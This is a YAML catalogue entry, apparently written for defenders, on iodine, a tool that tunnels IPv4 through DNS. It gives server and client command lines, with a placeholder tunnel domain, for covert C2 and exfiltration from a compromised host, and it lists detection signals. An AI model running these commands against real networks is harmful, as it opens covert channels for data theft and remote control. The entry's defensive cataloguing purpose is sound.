---
Name: iodine
Description: iodine is a self-hosted tool that tunnels IPv4 traffic through the DNS protocol, letting a compromised host reach the operator's server when only DNS queries leave the network. The operator runs the iodined server on an authoritative domain and the compromised host runs the iodine client, which encodes IP traffic inside DNS queries and responses. Because the operator controls the authoritative name server, blocking relies on the binary and DNS-tunneling signal rather than a fixed vendor domain. It is abused for covert C2 and exfiltration, observed with Winnti and Russian military (GRU) actors, among others.
Author: cyberbuff
Created: 2026-09-22
Commands:
    - Command: iodined -f -P <PASSWORD> 10.0.0.1 <TUNNEL_DOMAIN>
      Description: Starts the operator-controlled DNS tunnel server on an authoritative domain, assigning a tunnel subnet and requiring the shared password from clients.
      Usecase: Standing up the DNS tunnel endpoint on a domain the operator controls.
      Category: Access
      Privileges: Administrator
      OperatingSystem: Linux, MacOS, BSD, Windows

    - Command: iodine -f -P <PASSWORD> <TUNNEL_DOMAIN>
      Description: Runs the client on a compromised host, tunnelling IPv4 traffic to the iodined server entirely inside DNS queries and responses via the local resolver.
      Usecase: Establishing covert C2 or exfiltration out of a network that only permits DNS.
      Category: Exfiltrate
      Privileges: Administrator
      OperatingSystem: Linux, MacOS, BSD, Windows
Custom_Domain_Supported: True
Full_Path:
    - Path: iodined server binary on the operator's authoritative name server and iodine client binary on the compromised host.
Detection:
    - Command: "Execution of the iodine client or iodined server binaries, and anomalous DNS query volume/entropy consistent with IPv4-over-DNS tunneling (long encoded subdomain labels, NULL/TXT/CNAME query floods)."
Resources:
    - Link: https://github.com/yarrick/iodine
    - Link: https://unit42.paloaltonetworks.com/dns-tunneling-in-the-wild/
---
